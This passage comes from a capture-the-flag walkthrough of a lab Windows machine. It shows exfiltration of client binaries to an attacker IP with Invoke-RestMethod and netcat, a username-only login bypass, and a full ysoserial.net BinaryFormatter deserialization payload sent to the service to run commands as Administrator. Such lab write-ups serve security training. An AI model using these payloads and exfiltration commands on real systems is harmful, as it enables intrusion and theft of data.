<p>After enumerating a little bit, I was looking for the custom application listening on port <em>4411</em>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\S</span>hares&gt; netstat -ano | Select-String LISTENING
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    TCP    0.0.0.0:4411           0.0.0.0:0              LISTENING       <span style="color:#ae81ff">3116</span>
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\S</span>hares&gt; Get-Process -Id <span style="color:#ae81ff">3116</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Handles  NPM<span style="color:#f92672">(</span>K<span style="color:#f92672">)</span>    PM<span style="color:#f92672">(</span>K<span style="color:#f92672">)</span>      WS<span style="color:#f92672">(</span>K<span style="color:#f92672">)</span>     CPU<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>     Id  SI ProcessName                                                  
</span></span><span style="display:flex;"><span>-------  ------    -----      -----     ------     --  -- -----------                                                  
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">439</span>      <span style="color:#ae81ff">15</span>    <span style="color:#ae81ff">17984</span>      <span style="color:#ae81ff">19940</span>              <span style="color:#ae81ff">3116</span>   <span style="color:#ae81ff">0</span> ScrambleServer                                               </span></span></code></pre></div>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\P</span>rogram Files&gt; dir
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    d-----       03/11/2021     20:49                ScrambleCorp
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\P</span>rogram Files&gt; cd ScrambleCorp
</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\S</span>crambleCorp&gt; dir
</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\S</span>crambleCorp&gt; dir : Access to the path <span style="color:#e6db74">&#39;C:\Program Files\ScrambleCorp&#39;</span> is denied.</span></span></code></pre></div></p>
<p>So it looks like we cannot see the server&rsquo;s directory, thus we can&rsquo;t reverse engineer this server, and since <em>Miscsvc</em> is the only user, I can guess that the <em>Administrator</em> is the one responsible of it, which might be our way to escalate. I then found the <em>client executable</em> in one of the shares that <em>Miscsvc</em> had read permission to.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\S</span>hares<span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\A</span>pps<span style="color:#ae81ff">\S</span>ales Order Client&gt; dir
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\S</span>hares<span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\A</span>pps<span style="color:#ae81ff">\S</span>ales Order Client
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name                                                                  
</span></span><span style="display:flex;"><span>----                -------------         ------ ----                                                                  
</span></span><span style="display:flex;"><span>-a----       05/11/2021     20:52          <span style="color:#ae81ff">86528</span> ScrambleClient.exe                                                    
</span></span><span style="display:flex;"><span>-a----       05/11/2021     20:52          <span style="color:#ae81ff">19456</span> ScrambleLib.dll                                                       </span></span></code></pre></div></p>
<p>So I&rsquo;ll copy these two files to my kali machine. I&rsquo;ll use powershell <em>Invoke-RestMethod</em> which will allow me to send <em>Post</em> requests including the file as parameter, then will catch this request from my kali machine using <em>netcat</em>.
However, I need to copy these files to a directory that I own to avoid access denied error.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cp ScrambleClient.exe C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\m</span>iscsvc<span style="color:#ae81ff">\d</span>ocuments<span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>PS C:<span style="color:#ae81ff">\S</span>hares<span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\A</span>pps<span style="color:#ae81ff">\S</span>ales Order Client&gt; cp ScrambleLib.dll C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\m</span>iscsvc<span style="color:#ae81ff">\d</span>ocuments<span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>PS C:<span style="color:#ae81ff">\S</span>hares<span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\A</span>pps<span style="color:#ae81ff">\S</span>ales Order Client&gt; cd C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\m</span>iscsvc<span style="color:#ae81ff">\d</span>ocuments<span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>PS C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\m</span>iscsvc<span style="color:#ae81ff">\d</span>ocuments&gt; Invoke-RestMethod -Uri <span style="color:#e6db74">&#34;http://10.10.16.59:9001/&#34;</span> -Method Post -UseDefaultCredentials -Infile <span style="color:#e6db74">&#34;ScrambleClient.exe&#34;</span></span></span></code></pre></div>
On kali I&rsquo;ll catch this using
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc -lvnp <span style="color:#ae81ff">9001</span> | awk <span style="color:#e6db74">&#39;NR &gt; 7 { print }&#39;</span> &gt; ScrambleClient.exe</span></span></code></pre></div></p>
<ul>
<li>I used awk here to strip the first few lines of <em>HTTP Request</em> that include <em>Request Line</em> and <em>Request Headers</em> because I only need the content of the files.</li>
<li>Also, I need to press <em>ENTER</em> key in my netcat listener in order to terminate the connection from <em>Invoke-RestMethod</em>.</li>
</ul>
<h2 id="exploring-scrambleclient-executable">Exploring ScrambleClient executable</h2>
<p>From this point, I&rsquo;ll spawn <a href="https://github.com/mandiant/commando-vm"><em>Commando VM</em></a> (windows vm for penetration testing) in order to better debug the application using <a href="https://github.com/dnSpy/dnSpy"><em>dnspy</em></a>.</p>
<p><img src="application-image.png" alt="Application Image"></p>
<p>Looks like this application requires some credentials (the old ones did not work)</p>
<p>While inspecting it using <a href="https://github.com/dnSpy/dnSpy"><em>dnspy</em></a> I found an interesting <em>login</em> check function</p>
<p><img src="dnspy-finding-login-function.png" alt="Dnspy Finding Login Function"></p>
<p>Double clicking this function will show us how it handles the checking</p>
<p><img src="bypassing-login-custom-application.png" alt="Bypassing Login in Custom Application"></p>
<p>It appears that anyone with the name <em>scrmdev</em> can login to the application without even supplying a password!</p>
<p><img src="orders-custom-app.png" alt="Orders Custom App"></p>
<h3 id="finding-potential-desirialization-vulnerability">Finding Potential Desirialization Vulnerability</h3>
<p>Scrolling down a little bit in <a href="https://github.com/dnSpy/dnSpy"><em>dnspy</em></a>, I came accross an upload function that uploads some data to the server, but what&rsquo;s interesting about it is that it uses serialization.</p>
<p><img src="upload-function-using-serialization.png" alt="Finding Interesting Uploads Function"></p>
<p>Digging deeper, I found that it uses <a href="https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide#binaryformatter-security-vulnerabilities"><em>BinaryFormatter</em></a> object which is vulnerable to <a href="https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide#binaryformatter-security-vulnerabilities"><em>Desirialization Attack</em></a></p>
<p><img src="use-of-binaryformatter.png" alt="Finding the use of BinaryFormatter"></p>
<p>Since this is the client application, I can assume that the server also desirialzes this object using <a href="https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide#binaryformatter-security-vulnerabilities"><em>BinaryFormatter</em></a>, thus is prone to <a href="https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide#binaryformatter-security-vulnerabilities"><em>Desirialization Attack</em></a>.</p>
<h3 id="exploiting-desirialization-vulnerability">Exploiting Desirialization Vulnerability</h3>
<p>I found these blogs to be useful to understand how to exploit this vulnerabilty:</p>
<ul>
<li><a href="https://medium.com/@frycos/yet-another-net-deserialization-35f6ce048df7">https://medium.com/@frycos/yet-another-net-deserialization-35f6ce048df7</a></li>
<li><a href="https://vbscrub.com/2020/02/05/net-deserialization-exploits-explained/">https://vbscrub.com/2020/02/05/net-deserialization-exploits-explained/</a></li>
</ul>
<p>I&rsquo;ll use <a href="https://github.com/pwntester/ysoserial.net"><em>ysoserial.net</em></a> to generate the payload
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>&gt; .<span style="color:#ae81ff">\y</span>soserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c <span style="color:#e6db74">&#39;cmd.exe /C type C:\Users\Administrator\Desktop\root.txt &gt; C:\Users\Miscsvc\PWNED.txt&#39;</span> -o base64
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAFcvYyBjbWQuZXhlIC9DIHR5cGUgQzpcVXNlcnNcQWRtaW5pc3RyYXRvclxEZXNrdG9wXHJvb3QudHh0ID4gQzpcVXNlcnNcTWlzY3N2Y1xQV05FRC50eHQGBwAAAANjbWQEBQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQdtZXRob2QwB21ldGhvZDEDAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCQgAAAAJCQAAAAkKAAAABAgAAAAwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BwAAAAR0eXBlCGFzc2VtYmx5BnRhcmdldBJ0YXJnZXRUeXBlQXNzZW1ibHkOdGFyZ2V0VHlwZU5hbWUKbWV0aG9kTmFtZQ1kZWxlZ2F0ZUVudHJ5AQECAQEBAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkGCwAAALACU3lzdGVtLkZ1bmNgM1tbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQYMAAAAS21zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQoGDQAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5Bg4AAAAaU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MGDwAAAAVTdGFydAkQAAAABAkAAAAvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIHAAAABE5hbWUMQXNzZW1ibHlOYW1lCUNsYXNzTmFtZQlTaWduYXR1cmUKU2lnbmF0dXJlMgpNZW1iZXJUeXBlEEdlbmVyaWNBcmd1bWVudHMBAQEBAQADCA1TeXN0ZW0uVHlwZVtdCQ8AAAAJDQAAAAkOAAAABhQAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGFQAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKAQoAAAAJAAAABhYAAAAHQ29tcGFyZQkMAAAABhgAAAANU3lzdGVtLlN0cmluZwYZAAAAK0ludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGGgAAADJTeXN0ZW0uSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKARAAAAAIAAAABhsAAABxU3lzdGVtLkNvbXBhcmlzb25gMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JDAAAAAoJDAAAAAkYAAAACRYAAAAKCw<span style="color:#f92672">==</span></span></span></code></pre></div></p>
<p>Now let&rsquo;s try to send this encoded payload to see if we get anything back.</p>
<h3 id="understanding-how-to-send-data">Understanding How to send Data</h3>
<p>I&rsquo;ll use <em>netcat</em> to connect to the server, however I need to know how to send data for the server to accept it.</p>
<p>Again using <a href="https://github.com/dnSpy/dnSpy"><em>dnspy</em></a></p>
<p><img src="finding-request-function.png" alt="Finding Request Method"></p>
<p>This function appears to be taking two parameters <em>RequestType.UploadOrder</em> and the <em>Base64 Encoded Data</em>
Digging deeper</p>
<p><img src="finding-value-of-parameters.png" alt="Finding Value of Parameters"></p>
<p><img src="understanding-the-request-method.png" alt="Understanding the request method"></p>
<p>I can see that the request is done under this form: <em>UPLOAD_ORDER;[Base64 Encoded Data]</em></p>
<h3 id="getting-command-execution-as-administrator">Getting Command Execution As Administrator</h3>
<p>Now I can connect using netcat and test if the payload will work
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc scrm.local <span style="color:#ae81ff">4411</span>
</span></span><span style="display:flex;"><span>SCRAMBLECORP_ORDERS_V1.0.3;
</span></span><span style="display:flex;"><span>UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAFcvYyBjbWQuZXhlIC9DIHR5cGUgQzpcVXNlcnNcQWRtaW5pc3RyYXRvclxEZXNrdG9wXHJvb3QudHh0ID4gQzpcVXNlcnNcTWlzY3N2Y1xQV05FRC50eHQGBwAAAANjbWQEBQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQdtZXRob2QwB21ldGhvZDEDAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCQgAAAAJCQAAAAkKAAAABAgAAAAwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BwAAAAR0eXBlCGFzc2VtYmx5BnRhcmdldBJ0YXJnZXRUeXBlQXNzZW1ibHkOdGFyZ2V0VHlwZU5hbWUKbWV0aG9kTmFtZQ1kZWxlZ2F0ZUVudHJ5AQECAQEBAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkGCwAAALACU3lzdGVtLkZ1bmNgM1tbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQYMAAAAS21zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQoGDQAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5Bg4AAAAaU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MGDwAAAAVTdGFydAkQAAAABAkAAAAvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIHAAAABE5hbWUMQXNzZW1ibHlOYW1lCUNsYXNzTmFtZQlTaWduYXR1cmUKU2lnbmF0dXJlMgpNZW1iZXJUeXBlEEdlbmVyaWNBcmd1bWVudHMBAQEBAQADCA1TeXN0ZW0uVHlwZVtdCQ8AAAAJDQAAAAkOAAAABhQAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGFQAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKAQoAAAAJAAAABhYAAAAHQ29tcGFyZQkMAAAABhgAAAANU3lzdGVtLlN0cmluZwYZAAAAK0ludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGGgAAADJTeXN0ZW0uSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKARAAAAAIAAAABhsAAABxU3lzdGVtLkNvbXBhcmlzb25gMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JDAAAAAoJDAAAAAkYAAAACRYAAAAKCw<span style="color:#f92672">==</span></span></span></code></pre></div>
From my previous shell:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\m</span>iscsvc&gt; cat PWNED.txt
</span></span><span style="display:flex;"><span>296**************************30a</span></span></code></pre></div></p>
<p>We can now execute commands as <em>Administrator</em></p>
<p>If you&rsquo;re following along, you might have noticed that we can get Administrator directly, and avoid the use of <em>xp_cmdshell</em>, by simply requesting a <em>TGT</em> for user <em>Miscsvc</em> after getting his credentials, and then use the ticket with <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py"><em>impacket-smbclient.py</em></a> (-k option like before) to read the shares and get <em>ScrambledClient.exe</em> then exploit the server.</p>
]]></content>
        </item>
        
    </channel>
</rss>
